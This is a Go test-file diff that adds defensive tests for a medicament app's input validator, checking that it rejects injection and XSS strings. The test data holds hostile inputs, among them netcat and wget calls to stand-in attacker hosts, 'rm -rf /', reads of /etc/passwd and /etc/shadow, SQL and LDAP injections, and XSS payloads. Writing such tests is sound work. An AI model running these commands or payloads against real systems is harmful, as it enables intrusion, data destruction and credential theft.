@@ -573,7 +573,7 @@ func TestValidateInput_InvalidCharacters(t *testing.T) {
 		"test{medicament}",
 		"test(medicament)",
 		"test^medicament",
-		"test`medicament",
+		// Note: backtick (`) is caught by dangerous pattern check (command injection)
 		"test~medicament",
 		"test!medicament",
 		"test?medicament",
@@ -690,6 +690,217 @@ func BenchmarkValidateInput(b *testing.B) {
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		validator.ValidateInput(input)
+	}
+}
+
+func TestValidateInput_AdvancedSecurityPatterns(t *testing.T) {
+	validator := NewDataValidator()
+
+	// Test for SQL injection patterns
+	sqlInjectionInputs := []string{
+		"'; DROP TABLE medicaments; --",
+		"' OR '1'='1",
+		"' UNION SELECT * FROM users --",
+		"1'; DELETE FROM medicaments WHERE 't'='t",
+		"' OR 1=1 --",
+		"' OR 'a'='a",
+		"1' OR '1'='1' /*",
+		"admin'--",
+		"admin' /*",
+		"' or 1=1#",
+		"' or 1=1--",
+		"' or 1=1/*",
+		") or '1'='1--",
+		") or (1=1--",
+	}
+
+	for _, input := range sqlInjectionInputs {
+		t.Run("sql_injection_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for SQL injection pattern in input '%s'", input)
+			}
+		})
+	}
+
+	// Test for command injection patterns
+	commandInjectionInputs := []string{
+		"; ls -la",
+		"| cat /etc/passwd",
+		"& echo 'hack'",
+		"`whoami`",
+		"$(id)",
+		"; rm -rf /",
+		"| nc attacker.com 4444",
+		"&& curl malicious.com",
+		"; wget malicious.com/shell.sh",
+		"|| ping -c 10 127.0.0.1",
+	}
+
+	for _, input := range commandInjectionInputs {
+		t.Run("command_injection_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for command injection pattern in input '%s'", input)
+			}
+		})
+	}
+
+	// Test for path traversal patterns
+	pathTraversalInputs := []string{
+		"../../../etc/passwd",
+		"..\\..\\..\\windows\\system32",
+		"....//....//....//etc/passwd",
+		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+		"..%252f..%252f..%252fetc%252fpasswd",
+		"file:///etc/passwd",
+		"/etc/shadow",
+		"C:\\windows\\system32\\config\\sam",
+	}
+
+	for _, input := range pathTraversalInputs {
+		t.Run("path_traversal_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for path traversal pattern in input '%s'", input)
+			}
+		})
+	}
+
+	// Test for LDAP injection patterns
+	ldapInjectionInputs := []string{
+		"*)(&",
+		"*)(|(objectClass=*)",
+		"*)(|(cn=*))",
+		"*))%00",
+		"admin)(&(password=*))",
+		"*)|(cn=*))",
+	}
+
+	for _, input := range ldapInjectionInputs {
+		t.Run("ldap_injection_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for LDAP injection pattern in input '%s'", input)
+			}
+		})
+	}
+
+	// Test for NoSQL injection patterns
+	nosqlInjectionInputs := []string{
+		"{$ne: null}",
+		"{$gt: \"\"}",
+		"{$where: \"return true\"}",
+		"{$or: [{\"\": \"\"}]}",
+		"{$regex: \".*\"}",
+		"{$expr: {$eq: [\"$field\", \"$field\"]}}",
+	}
+
+	for _, input := range nosqlInjectionInputs {
+		t.Run("nosql_injection_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for NoSQL injection pattern in input '%s'", input)
+			}
+		})
+	}
+}
+
+func TestValidateInput_XSSAdvancedPatterns(t *testing.T) {
+	validator := NewDataValidator()
+
+	// Test for advanced XSS patterns
+	advancedXSSInputs := []string{
+		"<img src=x onerror=alert('xss')>",
+		"<svg onload=alert('xss')>",
+		"<iframe src=javascript:alert('xss')>",
+		"<body onload=alert('xss')>",
+		"<input onfocus=alert('xss') autofocus>",
+		"<select onfocus=alert('xss') autofocus>",
+		"<textarea onfocus=alert('xss') autofocus>",
+		"<keygen onfocus=alert('xss') autofocus>",
+		"<video><source onerror=alert('xss')>",
+		"<audio src=x onerror=alert('xss')>",
+		"<details open ontoggle=alert('xss')>",
+		"<marquee onstart=alert('xss')>",
+		"<isindex action=javascript:alert('xss') type=submit>",
+		"<form><button formaction=javascript:alert('xss')>",
+		"<meta http-equiv=refresh content=0;url=javascript:alert('xss')>",
+		"<link rel=import href=javascript:alert('xss')>",
+	}
+
+	for _, input := range advancedXSSInputs {
+		t.Run("advanced_xss_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for advanced XSS pattern in input '%s'", input)
+			}
+		})
+	}
+
+	// Test for encoded XSS patterns
+	encodedXSSInputs := []string{
+		"%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
+		"&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
+		"&#60;script&#62;alert&#40;&#39;xss&#39;&#41;&#60;/script&#62;",
+		"&#x3C;script&#x3E;alert&#x28;&#x27;xss&#x27;&#x29;&#x3C;/script&#x3E;",
+	}
+
+	for _, input := range encodedXSSInputs {
+		t.Run("encoded_xss_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			// Note: These might not be caught by current validation since they're encoded
+			// This test documents the current limitation
+			if err != nil {
+				t.Logf("Encoded XSS pattern caught (good): '%s'", input)
+			} else {
+				t.Logf("Encoded XSS pattern not caught (expected limitation): '%s'", input)
+			}
+		})
+	}
+}
+
+func TestValidateInput_DoSProtection(t *testing.T) {
+	validator := NewDataValidator()
+
+	// Test for very long inputs that might cause DoS
+	veryLongInputs := []string{
+		string(make([]byte, 1000)),   // 1000 characters
+		string(make([]byte, 10000)),  // 10000 characters
+		string(make([]byte, 100000)), // 100000 characters
+	}
+
+	for i, input := range veryLongInputs {
+		t.Run(fmt.Sprintf("very_long_input_%d", i), func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for very long input (%d characters)", len(input))
+			}
+
+			expectedError := "input too long: maximum 50 characters"
+			if err.Error() != expectedError {
+				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
+			}
+		})
+	}
+
+	// Test for inputs with many special characters that might cause regex DoS
+	specialCharHeavyInputs := []string{
+		"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!",
+		"??????????????????????????????????????????????????",
+		"%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%",
+		"**************************************************",
+		"++++++++++++++++++++++++++++++++++++++++++++++++++",
+		"==================================================",
+	}
+
+	for _, input := range specialCharHeavyInputs {
+		t.Run("special_char_heavy_"+input, func(t *testing.T) {
+			err := validator.ValidateInput(input)
+			if err == nil {
+				t.Errorf("Expected error for special character heavy input '%s'", input)
+			}
+		})
 	}
 }
 
